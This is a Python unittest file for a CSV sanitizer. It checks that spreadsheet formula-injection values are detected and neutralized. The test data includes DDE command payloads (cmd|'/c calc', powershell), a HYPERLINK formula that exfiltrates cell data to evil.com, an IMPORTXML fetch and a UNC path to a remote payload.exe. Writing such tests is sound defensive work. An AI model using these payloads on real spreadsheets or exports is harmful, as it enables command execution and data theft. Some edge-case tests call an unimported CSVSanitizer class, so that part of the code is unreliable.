"""
Security tests for CSV Sanitizer - CSV Injection Prevention

These tests verify that the CSV sanitizer properly protects against:
- Formula injection (=, +, -, @)
- Command execution attempts
- Data exfiltration via formulas
- URI-based attacks
- UNC path injection

Author: Security Testing
Created: 2025-11-29
"""

import unittest
import tempfile
import csv
import os
from pathlib import Path

from shared.csv_sanitizer import sanitize_field, sanitize_record, sanitize_records, is_dangerous
from shared.file_operations import save_csv


class TestCSVSanitizer_FormulaInjection(unittest.TestCase):
    """Test cases for formula injection prevention."""

    def test_formula_injection_equals__neutralized(self):
        """Test that formulas starting with = are neutralized."""
        dangerous_value = "=cmd|'/c calc'"
        result = sanitize_field(dangerous_value)

        # Should be prefixed with single quote to neutralize
        self.assertEqual(result, "'=cmd|'/c calc'")
        self.assertTrue(is_dangerous(dangerous_value))

    def test_formula_injection_plus__neutralized(self):
        """Test that formulas starting with + are neutralized."""
        dangerous_value = "+cmd|'/c notepad'"
        result = sanitize_field(dangerous_value)

        self.assertEqual(result, "'+cmd|'/c notepad'")
        self.assertTrue(is_dangerous(dangerous_value))

    def test_formula_injection_minus__neutralized(self):
        """Test that formulas starting with - are neutralized."""
        dangerous_value = "-cmd|'/c powershell'"
        result = sanitize_field(dangerous_value)

        self.assertEqual(result, "'-cmd|'/c powershell'")
        self.assertTrue(is_dangerous(dangerous_value))

    def test_formula_injection_at__neutralized(self):
        """Test that formulas starting with @ are neutralized."""
        dangerous_value = "@SUM(1+1)*cmd|'/c calc'"
        result = sanitize_field(dangerous_value)

        self.assertEqual(result, "'@SUM(1+1)*cmd|'/c calc'")
        self.assertTrue(is_dangerous(dangerous_value))

    def test_formula_injection_sum__neutralized(self):
        """Test that SUM formulas are neutralized."""
        dangerous_value = "=SUM(A1:A10)"
        result = sanitize_field(dangerous_value)

        self.assertEqual(result, "'=SUM(A1:A10)")

    def test_formula_injection_hyperlink__neutralized(self):
        """Test that HYPERLINK formulas with exfiltration attempts are neutralized."""
        dangerous_value = '=HYPERLINK("http://evil.com/?data="&A1&A2,"Click me")'
        result = sanitize_field(dangerous_value)

        self.assertTrue(result.startswith("'"))


class TestCSVSanitizer_CommandInjection(unittest.TestCase):
    """Test cases for command execution prevention."""

    def test_command_injection_pipe__neutralized(self):
        """Test that command pipe operators are neutralized."""
        dangerous_value = "=cmd|'/c calc'!A0"
        result = sanitize_field(dangerous_value)

        self.assertTrue(result.startswith("'"))
        self.assertTrue(is_dangerous(dangerous_value))

    def test_command_injection_embedded_pipe__neutralized(self):
        """Test that embedded pipe commands are neutralized."""
        # This should be caught by the suspicious pattern check
        dangerous_value = "test cmd|'/c notepad' embedded"
        result = sanitize_field(dangerous_value)

        self.assertTrue(result.startswith("'"))


class TestCSVSanitizer_URIInjection(unittest.TestCase):
    """Test cases for URI-based injection prevention."""

    def test_uri_injection_http__neutralized(self):
        """Test that HTTP URIs in formula context are neutralized."""
        dangerous_value = "=IMPORTXML(\"http://evil.com/data.xml\",\"//node\")"
        result = sanitize_field(dangerous_value)

        self.assertTrue(result.startswith("'"))

    def test_uri_injection_file__neutralized(self):
        """Test that file:// URIs are neutralized."""
        dangerous_value = "file:///c:/windows/system32/calc.exe"
        result = sanitize_field(dangerous_value)

        self.assertTrue(result.startswith("'"))
        self.assertTrue(is_dangerous(dangerous_value))


class TestCSVSanitizer_UNCPathInjection(unittest.TestCase):
    """Test cases for UNC path injection prevention."""

    def test_unc_path_injection__neutralized(self):
        """Test that UNC paths are neutralized."""
        dangerous_value = "\\\\evil.com\\share\\payload.exe"
        result = sanitize_field(dangerous_value)

        self.assertTrue(result.startswith("'"))
        self.assertTrue(is_dangerous(dangerous_value))


class TestCSVSanitizer_SpecialCharacters(unittest.TestCase):
    """Test cases for special character handling."""

    def test_newline_injection__neutralized(self):
        """Test that newlines at start are neutralized."""
        dangerous_value = "\ninjected line"
        result = sanitize_field(dangerous_value)

        self.assertTrue(result.startswith("'"))

    def test_tab_injection__neutralized(self):
        """Test that tabs at start are neutralized."""
        dangerous_value = "\tinjected tab"
        result = sanitize_field(dangerous_value)

        self.assertTrue(result.startswith("'"))

    def test_carriage_return_injection__neutralized(self):
        """Test that carriage returns at start are neutralized."""
        dangerous_value = "\rinjected CR"
        result = sanitize_field(dangerous_value)

        self.assertTrue(result.startswith("'"))


class TestCSVSanitizer_SafeValues(unittest.TestCase):
    """Test cases for safe values that should not be modified."""

    def test_normal_text__unchanged(self):
        """Test that normal text is not modified."""
        safe_value = "Normal description text"
        result = sanitize_field(safe_value)

        self.assertEqual(result, safe_value)
        self.assertFalse(is_dangerous(safe_value))

    def test_empty_string__unchanged(self):
        """Test that empty strings are handled correctly."""
        result = sanitize_field("")
        self.assertEqual(result, "")

    def test_none_value__converted_to_empty(self):
        """Test that None values are converted to empty string."""
        result = sanitize_field(None)
        self.assertEqual(result, "")

    def test_numeric_value__converted_to_string(self):
        """Test that numeric values are converted to strings."""
        result = sanitize_field(12345)
        self.assertEqual(result, "12345")

    def test_whitespace_only__returns_empty(self):
        """Test that whitespace-only values return empty string."""
        result = sanitize_field("   ")
        self.assertEqual(result, "")

    def test_normal_url__unchanged(self):
        """Test that normal URLs (not in formula) are not modified."""
        safe_value = "Visit our website at example.com"
        result = sanitize_field(safe_value)

        # This should not be modified as it's not a formula
        self.assertEqual(result, safe_value)

    def test_minus_in_middle__unchanged(self):
        """Test that minus sign in middle of text is not modified."""
        safe_value = "High-quality photo"
        result = sanitize_field(safe_value)

        self.assertEqual(result, safe_value)


class TestCSVSanitizer_RecordSanitization(unittest.TestCase):
    """Test cases for sanitizing entire records and lists."""

    def test_sanitize_record__all_fields_cleaned(self):
        """Test that all fields in a record are sanitized."""
        record = {
            "title": "=cmd|calc",
            "description": "Normal description",
            "keywords": "+SUM(1+1)",
            "category": "Nature"
        }

        result = sanitize_record(record)

        self.assertTrue(result["title"].startswith("'"))
        self.assertEqual(result["description"], "Normal description")
        self.assertTrue(result["keywords"].startswith("'"))
        self.assertEqual(result["category"], "Nature")

    def test_sanitize_records__list_of_records(self):
        """Test that a list of records is sanitized."""
        records = [
            {"title": "=cmd|calc", "desc": "Test 1"},
            {"title": "Normal", "desc": "@SUM(1+1)"},
            {"title": "Safe", "desc": "Also safe"}
        ]

        result = sanitize_records(records)

        self.assertEqual(len(result), 3)
        self.assertTrue(result[0]["title"].startswith("'"))
        self.assertEqual(result[1]["title"], "Normal")
        self.assertTrue(result[1]["desc"].startswith("'"))


class TestCSVSanitizer_FileOperationsIntegration(unittest.TestCase):
    """Test integration with file_operations save_csv function."""

    def setUp(self):
        """Set up test fixtures."""
        self.test_dir = tempfile.mkdtemp()

    def tearDown(self):
        """Clean up test fixtures."""
        import shutil
        shutil.rmtree(self.test_dir)

    def test_save_csv__with_sanitization__safe(self):
        """Test that save_csv with sanitization neutralizes dangerous values."""
        output_file = os.path.join(self.test_dir, "test_output.csv")

        records = [
            {"title": "=cmd|calc", "description": "Dangerous formula"},
            {"title": "Normal title", "description": "Safe description"}
        ]

        # Save with sanitization (default)
        save_csv(records, output_file, sanitize=True)

        # Read back and verify
        with open(output_file, 'r', encoding='utf-8-sig', newline='') as f:
            reader = csv.DictReader(f)
            rows = list(reader)

        self.assertEqual(len(rows), 2)
        # The dangerous value should be prefixed with '
        self.assertTrue(rows[0]["title"].startswith("'"))
        self.assertEqual(rows[1]["title"], "Normal title")

    def test_save_csv__without_sanitization__preserves_dangerous(self):
        """Test that save_csv without sanitization preserves original values."""
        output_file = os.path.join(self.test_dir, "test_output_unsafe.csv")

        records = [
            {"title": "=cmd|calc", "description": "Dangerous formula"}
        ]

        # Save without sanitization
        save_csv(records, output_file, sanitize=False)

        # Read back and verify - dangerous value should be preserved
        with open(output_file, 'r', encoding='utf-8-sig', newline='') as f:
            reader = csv.DictReader(f)
            rows = list(reader)

        self.assertEqual(rows[0]["title"], "=cmd|calc")


class TestCSVSanitizer_EdgeCases(unittest.TestCase):
    """Test edge cases and complex scenarios."""

    def test_double_quote_escaping__preserved(self):
        """Test that quote escaping still works after sanitization."""
        value = 'Text with "quotes" inside'
        result = CSVSanitizer.sanitize_field(value)

        # Should not be modified (no dangerous prefix)
        self.assertEqual(result, value)

    def test_existing_single_quote_prefix__not_doubled(self):
        """Test that existing single quote prefix is not doubled."""
        value = "'=SUM(1+1)"
        result = CSVSanitizer.sanitize_field(value)

        # Should strip existing quote and add one (not double it)
        self.assertEqual(result, "'=SUM(1+1)")

    def test_mixed_dangerous_patterns__all_detected(self):
        """Test detection of multiple dangerous patterns."""
        patterns = [
            "=1+1",
            "+SUM(A1)",
            "-1*2",
            "@NOW()",
            "\ttab prefix",
            "\nnewline prefix",
            "cmd|calc",
            "\\\\server\\share",
            "file:///path"
        ]

        for pattern in patterns:
            with self.subTest(pattern=pattern):
                self.assertTrue(
                    is_dangerous(pattern),
                    f"Pattern '{pattern}' should be detected as dangerous"
                )


if __name__ == '__main__':
    unittest.main()
